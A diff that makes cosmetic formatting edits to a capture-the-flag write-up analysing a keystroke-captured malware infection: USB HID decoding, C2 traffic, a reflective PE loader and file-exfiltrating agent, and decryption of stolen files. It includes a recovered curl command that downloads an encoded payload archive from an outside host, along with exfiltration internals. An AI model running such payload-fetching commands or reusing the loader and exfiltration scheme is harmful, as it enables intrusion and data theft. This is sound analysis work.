@@ -38,7 +38,7 @@ tags: ["forensics", "malware", "rev", "windows"]
 
 ---
 
-## Phase 1 — USB Keyboard Capture Analysis
+## Phase 1: USB Keyboard Capture Analysis
 
 The challenge name hints at keystroke capture. The `monitor_hardware` file is a USB pcap containing HID keyboard data.
 
@@ -50,7 +50,7 @@ tshark -r monitor_hardware \
   -T fields -e usbhid.data > usb_hid_data.txt
 ```
 
-This yields **450 HID reports** from USB device `2.10.1` — 8-byte HID keyboard reports in format: `[modifier] 00 [keycode] 00 00 00 00 00`.
+This yields **450 HID reports** from USB device `2.10.1` - 8-byte HID keyboard reports in format: `[modifier] 00 [keycode] 00 00 00 00 00`.
 
 ### Decoding
 
@@ -137,12 +137,12 @@ exit
 ```bash
 curl -s 'https://0x0.st/PbWE.txt' | base64 -d > sus.zip
 unzip -P '1m_g0d_!!' sus.zip -d sus_out
-# Result: module.exe — PE32+ (x86-64), 74,240 bytes
+# Result: module.exe - PE32+ (x86-64), 74,240 bytes
 ```
 
 ---
 
-## Phase 2 — Network Traffic Analysis
+## Phase 2: Network Traffic Analysis
 
 ### HTTP Traffic to C2
 
@@ -198,11 +198,11 @@ POST data: hex-encoded filename, then hex-encoded encrypted data.
 | `IDK_why_I_saved_this.xlsx` | 10,052 bytes | +4 key prefix |
 | `sexy_picture.jpg` | 33,524 bytes | +4 key prefix |
 
-All encrypted sizes have `size % 16 == 4` — the first 4 bytes are the key prefix (explained in Phase 7).
+All encrypted sizes have `size % 16 == 4` - the first 4 bytes are the key prefix (explained under Reversing the Encryption Algorithm).
 
 ---
 
-## Phase 3 — Malware Outer Layer (`module.exe`)
+## Phase 3: Malware Outer Layer (`module.exe`)
 
 ### Static Analysis (radare2)
 
@@ -248,7 +248,7 @@ $ tshark -r monitor_network -Y "http.response" -T fields -e http.file_data
 596f7520676f6f642062726f202121
 ```
 
-If they match, the same 32-byte hash is used as the AES key. Since the C2 hash is captured in the pcap, **the C2 hash itself IS the AES key** — no need to crack the computer name.
+If they match, the same 32-byte hash is used as the AES key. Since the C2 hash is captured in the pcap, **the C2 hash itself IS the AES key** - no need to crack the computer name.
 
 ```
 C2 hash = 66c9c5a2015ff2be075f3d430031f54d22f8ad7194363889a019350937946d74
@@ -257,14 +257,14 @@ AES key = raw bytes of above (32 bytes)
 
 ---
 
-## Phase 4 — Decrypting the Embedded Shellcode
+## Phase 4: Decrypting the Embedded Shellcode
 
 **decrypt_payload.py:**
 
 ```python
 #!/usr/bin/env python3
 """
-decrypt_payload.py — Decrypt module.exe's embedded resource using the C2 hash as AES key.
+decrypt_payload.py - Decrypt module.exe's embedded resource using the C2 hash as AES key.
 
 The malware fetches a SHA-256 hash from the C2 server (GET /) and compares it
 against SHA-256(ComputerName). When they match, that same hash (raw 32 bytes)
@@ -318,17 +318,17 @@ Decrypted shellcode: 36576 bytes → decrypted_shellcode.bin
 First 16 bytes: 5731c0b90a000000534883ec78488d7c
 ```
 
-The result is **not** an MZ PE but raw x86-64 shellcode — a reflective PE loader.
+The result is **not** an MZ PE but raw x86-64 shellcode - a reflective PE loader.
 
 ---
 
-## Phase 5 — Reversing the Shellcode (Reflective PE Loader)
+## Phase 5: Reversing the Shellcode (Reflective PE Loader)
 
 ### Structure
 
 The 36,576-byte shellcode consists of:
 
-1. **Code section** (offsets `0x000`–`0xc6c`): The reflective loader
+1. **Code section** (offsets `0x000` - `0xc6c`): The reflective loader
 2. **Packed PE data** (offset `0xc6d`): 7 blobs containing an inner PE stub
 3. **Config data** (offset `0x3760`): XOR-encrypted C2 agent DLL
 
@@ -339,7 +339,7 @@ Header: 7 entries × 8 bytes = 56-byte table of `(offset:u32, size:u32)` pairs:
 | Blob | Content | Size | Notes |
 |------|---------|------|-------|
 | 0 | Inner PE code section | 8,466 B | Executable code |
-| 1 | (empty) | 0 B | — |
+| 1 | (empty) | 0 B | - |
 | 2 | Relocations | 48 B | XOR-encrypted |
 | 3 | Import descriptors | 2,231 B | Raw import data |
 | 4 | DLL names | 30 B | XOR-encrypted → `kernel32\0ntdll\0shell32\0msvcrt\0` |
@@ -384,14 +384,14 @@ length-prefixed stream:
 u32  name_len  = 11
 char name[11]  = "shellcode \0"
 u32  pe_len    = 22016
-byte pe[22016] = MZ PE — the actual C2 agent
+byte pe[22016] = MZ PE - the actual C2 agent
 ```
 
 Total: 4 + 11 + 4 + 22016 = **22,035 bytes** (matches `data_size`)
 
 ---
 
-## Phase 6 — Extracting the C2 Agent (`shellcode_dll.exe`)
+## Phase 6: Extracting the C2 Agent (`shellcode_dll.exe`)
 
 **extract_c2_agent.py:**
 
@@ -401,7 +401,7 @@ using the recovered 343-byte key, then parses the length-prefixed DLL name + PE 
 ```python
 #!/usr/bin/env python3
 """
-extract_c2_agent.py — Extract the C2 agent DLL from the decrypted shellcode.
+extract_c2_agent.py - Extract the C2 agent DLL from the decrypted shellcode.
 
 The decrypted shellcode (from decrypt_payload.py) is a reflective PE loader.
 At offset 0x3760 there is a config data stream:
@@ -418,7 +418,7 @@ After XOR decryption the data_blob contains a length-prefixed stream:
   u32  name_len  = 11
   char name[11]  = "shellcode \\0"
   u32  pe_len    = 22016
-  byte pe[22016] = MZ PE — the actual C2 agent
+  byte pe[22016] = MZ PE - the actual C2 agent
 
 Usage:
   python3 extract_c2_agent.py [decrypted_shellcode.bin]
@@ -796,9 +796,9 @@ The extracted `shellcode_dll.exe` (22,016 bytes, x86-64 PE) is the file-stealing
 
 ---
 
-## Phase 7 — Reversing the Encryption Algorithm
+## Phase 7: Reversing the Encryption Algorithm
 
-### `fcn.140002240` — Encrypt & Exfiltrate
+### `fcn.140002240`: Encrypt & Exfiltrate
 
 Disassembled with radare2:
 
@@ -835,15 +835,15 @@ The function implements:
 
 ### AES-256 Confirmation
 
-- `fcn.140001000` (key schedule): Copies 32 bytes (8 × 4-byte words), then expands to 60 words — classic AES-256 key schedule
-- `fcn.140001c60` (block encrypt): Loop counter compared against `0x0e` (14) — **14 rounds = AES-256**
+- `fcn.140001000` (key schedule): Copies 32 bytes (8 × 4-byte words), then expands to 60 words - classic AES-256 key schedule
+- `fcn.140001c60` (block encrypt): Loop counter compared against `0x0e` (14) - **14 rounds = AES-256**
 - Inner loop calls SubBytes (`fcn.140001580`), ShiftRows+MixColumns (`fcn.140001600`), and AddRoundKey (`fcn.1400014d0`)
 - `fcn.140001d50` (CBC mode): XORs each plaintext block with previous ciphertext block before encrypting, processes in 16-byte chunks
 - `fcn.140001480` (init): Runs key schedule, then copies 16-byte IV to `ctx+0xf0`
 
 ### Decryption Is Deterministic
 
-The critical insight: **the first 4 bytes of each encrypted file ARE the random key bytes**. No need to know the PRNG seed or time — just:
+The critical insight: **the first 4 bytes of each encrypted file ARE the random key bytes**. No need to know the PRNG seed or time - just:
 
 1. Read first 4 bytes of encrypted data
 2. SHA-256(those 4 bytes) → AES key
@@ -852,12 +852,12 @@ The critical insight: **the first 4 bytes of each encrypted file ARE the random 
 
 ---
 
-## Phase 8 — Decrypting the Exfiltrated Files & Flag
+## Phase 8: Decrypting the Exfiltrated Files & Flag
 
 **decrypt_exfiltrated_files.py:**
 
 ```
-decrypt_exfiltrated_files.py — Decrypt the 4 exfiltrated files from the network pcap.
+decrypt_exfiltrated_files.py - Decrypt the 4 exfiltrated files from the network pcap.
 
 The C2 agent (shellcode_dll.exe) encrypts files as follows:
   1. srand(time(NULL)), generate 4 random bytes: key[i] = rand() & 0xFF
@@ -939,7 +939,7 @@ The flag is split across multiple files, hidden visually within the document con
 | File | Content | Flag Fragment |
 |------|---------|---------------|
 | `hello_darkness_my_old_friend.txt` | Author greeting from Reisen_1943 | *(context clue)* |
-| `IDK_why_I_saved_this.xlsx` | Vietnamese poetry (Truyện Kiều) in cell A1–A18, flag in cell A21 | `CMO{Dumb357` |
+| `IDK_why_I_saved_this.xlsx` | Vietnamese poetry (Truyện Kiều) in cell A1-A18, flag in cell A21 | `CMO{Dumb357` |
 | `sexy_picture.jpg` | JPEG image with text | `_P3r50n_` |
 | `Cool_Story.docx` | More Vietnamese poetry (Truyện Kiều), flag in background/formatting | `1n_7h3_M1lky_W4y_!!!}` |
 
